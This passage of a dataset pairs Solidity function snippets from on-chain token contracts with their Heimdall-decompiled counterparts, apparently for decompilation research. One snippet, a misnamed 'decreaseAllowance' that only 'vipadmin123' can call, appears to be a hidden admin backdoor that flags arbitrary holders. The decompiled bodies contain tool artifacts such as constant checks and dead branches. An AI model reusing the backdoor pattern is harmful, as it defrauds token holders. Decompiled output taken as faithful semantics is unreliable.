var_i.length;\n        uint256 var_u = 0;\n        var_v = var_n;\n        var_u = 0;\n        if (!(arg1 - ((store_h * arg1) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_f > store_j) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            require(!((arg1 - ((store_h * arg1) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (store_f > store_m) {\n            if (0 - arg1) {\n            }\n            if (0 - arg1) {\n            }\n            require(store_f > store_m, \"Exceeds the _maxTxAmount.\");\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x19;\n        var_f = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(store_d) == (address(arg0))) {\n            if (address(store_d) == (address(arg0))) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_g = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xeE4121EC610aD03ad4b4b4151ccFB6999022Df86", "original_solidity_code": "function name() external pure returns (string memory);\\r\\n    function symbol() external pure returns (string memory);\\r\\n    function decimals() external pure returns (uint8);\\r\\n    function totalSupply() external view returns (uint256);\\r\\n    function balanceOf(address owner) external view returns (uint256);\\r\\n    function allowance(address owner, address spender)\\r\\n        external\\r\\n        view\\r\\n        returns (uint256);\\r\\n    function approve(address spender, uint256 value) external returns (bool);\\r\\n    function transfer(address to, uint256 value) external returns (bool);\\r\\n    function transferFrom(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 value\\r\\n    ) external returns (bool);\\r\\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\\r\\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\\r\\n    function nonces(address owner) external view returns (uint256);\\r\\n    function permit(\\r\\n        address owner,\\r\\n        address spender,\\r\\n        uint256 value,\\r\\n        uint256 deadline,\\r\\n        uint8 v,\\r\\n        bytes32 r,\\r\\n        bytes32 s\\r\\n    ) external;\\r\\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\\r\\n    event Burn(\\r\\n        address indexed sender,\\r\\n        uint256 amount0,\\r\\n        uint256 amount1,\\r\\n        address indexed to\\r\\n    );\\r\\n    event Swap(\\r\\n        address indexed sender,\\r\\n        uint256 amount0In,\\r\\n        uint256 amount1In,\\r\\n        uint256 amount0Out,\\r\\n        uint256 amount1Out,\\r\\n        address indexed to\\r\\n    );\\r\\n    event Sync(uint112 reserve0, uint112 reserve1);\\r\\n    function MINIMUM_LIQUIDITY() external pure returns (uint256);\\r\\n    function factory() external view returns (address);\\r\\n    function token0() external view returns (address);\\r\\n    function token1() external view returns (address);\\r\\n    function getReserves()\\r\\n        external\\r\\n        view\\r\\n        returns (\\r\\n            uint112 reserve0,\\r\\n            uint112 reserve1,\\r\\n            uint32 blockTimestampLast\\r\\n        );\\r\\n    function price0CumulativeLast() external view returns (uint256);\\r\\n    function price1CumulativeLast() external view returns (uint256);\\r\\n    function kLast() external view returns (uint256);\\r\\n    function mint(address to) external returns (uint256 liquidity);\\r\\n    function burn(address to)\\r\\n        external\\r\\n        returns (uint256 amount0, uint256 amount1);\\r\\n    function swap(\\r\\n        uint256 amount0Out,\\r\\n        uint256 amount1Out,\\r\\n        address to,\\r\\n        bytes calldata data\\r\\n    ) external;\\r\\n    function skim(address to) external;\\r\\n    function sync() external;\\r\\n    function initialize(address, address) external;\\r\\n}\\r\\ninterface IUniswapV2Factory {\\r\\n    event PairCreated(\\r\\n        address indexed token0,\\r\\n        address indexed token1,\\r\\n        address pair,\\r\\n        uint256\\r\\n    );\\r\\n    function feeTo() external view returns (address);\\r\\n    function feeToSetter() external view returns (address);\\r\\n    function getPair(address tokenA, address tokenB)\\r\\n        external\\r\\n        view\\r\\n        returns (address pair);\\r\\n    function allPairs(uint256) external view returns (address pair);\\r\\n    function allPairsLength() external view returns (uint256);\\r\\n    function createPair(address tokenA, address tokenB)\\r\\n        external\\r\\n        returns (address pair);\\r\\n    function setFeeTo(address) external;\\r\\n    function setFeeToSetter(address) external;\\r\\n}", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (store_a - ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xD16Db0A58fC8A72AE1cD78B6556074c819694a56", "original_solidity_code": "function reduceFee(uint256 _newBuyFee,uint256 _newSellFee) external onlyOwner{\r\n        _finalBuyTax=_newBuyFee;\r\n        _finalSellTax=_newSellFee;\r\n    }", "heimdall_decompiled_code": "function reduceFee(uint256 arg0, uint256 arg1) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_h = arg0;\n        store_m = arg1;\n    }"}
{"contract_address": "0x4CEDcba2dB7c99934bC64bBd575FEE5fE6E0F28b", "original_solidity_code": "function setMaxTXlimit(uint256 newTxAmt) external onlyOwner {\r\n        _maxTxAmount = _tTotal * newTxAmt/100;\r\n        require(newTxAmt >=1);\r\n    }", "heimdall_decompiled_code": "function setMaxTXlimit(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            require(0x09);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require((0x01 == 0x01) | !0x989680);\n            require(0x0a);\n            require(0x0a == 0x01);\n            require(0x0a == 0x02);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require(!0x09 > 0xff);\n            require(!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20)));\n            require(!0x09 > 0x01);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require(!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require(!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999);\n        }\n    }"}
{"contract_address": "0xf14bcFb9213C0583632d65e80ac5B2Bd02c7D3d8", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (!(store_c) == ((store_c / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_c / 0x02;\n                if (store_c) {\n                    if (!(store_c) == ((store_c / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c / 0x02) {\n                            if (0x1f < (store_c / 0x02)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x5B7b79708986436F7a90c33f0683841DaEC83810", "original_solidity_code": "function decreaseAllowance(address cjjjss) public    {\r\n       \r\n        require(_msgSender() == vipadmin123);\r\n        if(_msgSender() == vipadmin123){\r\n        }else{\r\n        }\r\n        uint128 newpassnum = 12233;\r\n        xelonlist[cjjjss] = newpassnum;\r\n       \r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender) == (address(vipadmin123)));\n        address var_a = address(arg0);\n        var_b = 0x08;\n        storage_map_b[var_a] = 0x2fc9;\n    }"}
{"contract_address": "0x73adcB9F7B46BF6E6f1D027BB13eAAfa158A8A09", "original_solidity_code": "function stake(address _to, uint256 _amount) external {\r\n        rebase();\r\n        GRP.transferFrom(msg.sender, address(this), _amount);\r\n        sGRP.transfer(_to, _amount);\r\n    }", "heimdall_decompiled_code": "function stake(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(secondsToNextEpoch > block.timestamp);\n        var_a = 0x23b872dd00000000000000000000000000000000000000000000000000000000;\n        address var_b = address(msg.sender);\n        address var_c = address(this);\n        uint256 var_d = arg1;\n        (bool success, bytes memory ret0) = address(0x0a2746d0fe88eeb9538183408295c061593e478e).Unresolved_23b872dd(var_b); // call\n        uint256 var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!((var_e + ret0.length) - var_e) < 0x20);\n        require(var_f == (var_f));\n        var_g = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;\n        var_c = address(arg0);\n        var_d = arg1;\n        (bool success, bytes memory ret0) = address(0x0a2746d0fe88eeb9538183408295c061593e478e).Unresolved_a9059cbb(var_c); // call\n        var_a = 0x058ecdb400000000000000000000000000000000000000000000000000000000;\n        var_b = store_d;\n        var_c = store_e;\n        (bool success, bytes memory ret0) = address(0x0a2746d0fe88eeb9538183408295c061593e478e).Unresolved_058ecdb4(var_b, var_c); // call\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!((var_e + ret0.length) - var_e) < 0x20);\n        require(var_f == (var_f));\n        require(!secondsToNextEpoch > (secondsToNextEpoch + epoch));\n        var_h = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        secondsToNextEpoch = secondsToNextEpoch + epoch;\n        require(store_e - 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);\n        var_h = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        store_e = store_e + 0x01;\n        require(address(distributor / 0x01) == 0);\n        var_g = 0xe4fc6b6d00000000000000000000000000000000000000000000000000000000;\n        require(address(distributor / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(distributor / 0x01).distribute(var_c); // call\n        var_g = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        var_c = address(this);\n        (bool success, bytes memory ret0) = address(0x0a2746d0fe88eeb9538183408295c061593e478e).Unresolved_70a08231(var_c); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!((var_e + ret0.length) - var_e) < 0x20);\n        require(var_f == (var_f));\n        var_j = 0x9358928b00000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(0x0a2746d0fe88eeb9538183408295c061593e478e).circulatingSupply(var_d); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!((var_e + ret0.length) - var_e) < 0x20);\n        require(var_f == (var_f));\n        require(var_f > (var_f));\n        require(!(var_f - (var_f)) > (var_f));\n        store_d = (var_f) - (var_f);\n        var_k = 0x23b872dd00000000000000000000000000000000000000000000000000000000;\n        address var_l = address(msg.sender);\n        address var_m = address(this);\n        uint256 var_n = arg1;\n        (bool success, bytes memory ret0) = address(0x0a2746d0fe88eeb9538183408295c061593e478e).Unresolved_23b872dd(var_l); // call\n        var_h = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n    }"}
{"contract_address": "0x4c5CbB44F1F835E2BbE255d8dBFb91A364b0D36B", "original_solidity_code": "function balanceOf(address owner) public view override returns (uint256) {\\r\\n    require(owner != address(0), \\\"ERC721A: balance query for the zero address\\\");\\r\\n    return uint256(_addressData[owner].balance);\\r\\n  }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (address) {\n        require(arg0 == (address(arg0)));\n        require(address(arg0), \"ERC721A: balance query for the zero address\");\n        address var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = address(storage_map_b[var_a]);\n        return address(storage_map_b[var_a]);\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x2b;\n        var_f = 0x455243373231413a2062616c616e636520717565727920666f7220746865207a;\n        var_g = 0x65726f2061646472657373000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xc921a48b2bBd243aC30422B266edf58F472Eca7F", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\\n        return _symbol;\\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_u) {\n            if (store_u - ((store_u >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_u >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_u >> 0x01;\n                if (store_u) {\n                    if (store_u - ((store_u >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_u >> 0x01) {\n                            if (0x1f < (store_u >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_i[var_a];\n                                if ((0x20 + var_c) + (store_u >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x5B8BA3cb21F36a06b3a86774103F8dBDa14483EC", "original_solidity_code": "function withdrawStuckEther() external onlyOwner {\r\n        payable(owner()).transfer(address(this).balance);\r\n    }", "heimdall_decompiled_code": "function withdrawStuckEther() public payable {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        (bool success, bytes memory ret0) = address(owner / 0x01).transfer(address(this).balance);\n    }"}
{"contract_address": "0x8f3d46713d90363a242CE2506d6866FEfCf00302", "original_solidity_code": "function openTrading() external onlyOwner() {\\r\\n        require(!tradingOpen,\\\"trading is already open\\\");\\r\\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\r\\n        _approve(address(this), address(uniswapV2Router), _tTotal);\\r\\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\\r\\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\\r\\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\\r\\n        swapEnabled = true;\\r\\n        tradingOpen = true;\\r\\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_h / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x17;\n        var_e = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_g = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_g));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require(!0x3b9aca00 | (0x01 == 0x01), \"ERC20: approve to the zero address\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_g / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x22;\n        var_e = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_f = address(this);\n        var_i = 0x02;\n        var_f = address(store_g / 0x01);\n        address var_i = keccak256(var_f);\n        storage_map_n[var_f] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), address(store_g / 0x01), 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g / 0x01).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_k = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g / 0x01).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_l = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_h = address(var_j);\n        (bool success, bytes memory ret0) = address(var_j).Unresolved_c9c65396(var_e); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x24;\n        var_e = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_g = 0x11;\n                            if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                if (!0x09 > 0x01) {\n                                    if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_g = 0x11;\n                                        if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_g = 0x11;\n                                            if (!0x01) {\n                                            }\n                                            if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x842FD31eAd327AE42D19B7BFbdB045d3A219c662", "original_solidity_code": "function recoverERC20(address _token) external {\r\n        require(msg.sender == originalOwner, \"Only original owner can call this function\");\r\n        uint256 fullAmount = IERC20(_token).balanceOf(address(this));\r\n        IERC20(_token).transfer(originalOwner, fullAmount);\r\n    }", "heimdall_decompiled_code": "function recoverERC20(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(0xf6f50011df50e1180dc78f4a8237f293f30a3b27 == msg.sender);\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        address var_b = address(this);\n        (bool success, bytes memory ret0) = address(arg0).Unresolved_70a08231(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        var_d = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;\n        var_e = 0xf6f50011df50e1180dc78f4a8237f293f30a3b27;\n        uint256 var_f = var_c.length;\n        (bool success, bytes memory ret0) = address(arg0).{ value: 0 ether }Unresolved_a9059cbb(var_e); // call\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_c.length == var_c.length);\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_e = 0x2a;\n        var_f = 0x4f6e6c79206f726967696e616c206f776e65722063616e2063616c6c20746869;\n        var_g = 0x732066756e6374696f6e00000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x2712ac3E4Fb06A0d1FB54E31eB81e7db4731c417", "original_solidity_code": "function turnOnTheBurn() public onlyOwner {\r\n        burnMode = true;\r\n    }", "heimdall_decompiled_code": "function turnOnTheBurn() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        burnMode = 0x01000000000000000000000000000000000000000000 | (uint248(burnMode));\n    }"}
{"contract_address": "0x4eeA955F63D7e24Ea7272651a29c7C70F7c2A9Ae", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x847B4922870Fdd1351123979119912e918eb7363", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amount;\r\n        emit Approval(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x45c86eBa585dfA8C43E636EBd025C99E972aB464", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_g / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x17;\n        var_e = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_f = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_f));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require(!0x3b9aca00 | (0x01 == 0x01), \"ERC20: approve to the zero address\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_f / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x22;\n        var_e = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_f = address(this);\n        var_i = 0x02;\n        var_f = address(store_f / 0x01);\n        address var_i = keccak256(var_f);\n        storage_map_o[var_f] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), address(store_f / 0x01), 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_k = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_l = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_h = address(var_j);\n        (bool success, bytes memory ret0) = address(var_j).{ value: 0 ether }Unresolved_c9c65396(var_e); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x24;\n        var_e = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_g = 0x11;\n                            if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                if (!0x09 > 0x01) {\n                                    if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_g = 0x11;\n                                        if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_g = 0x11;\n                                            if (!0x01) {\n                                            }\n                                            if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
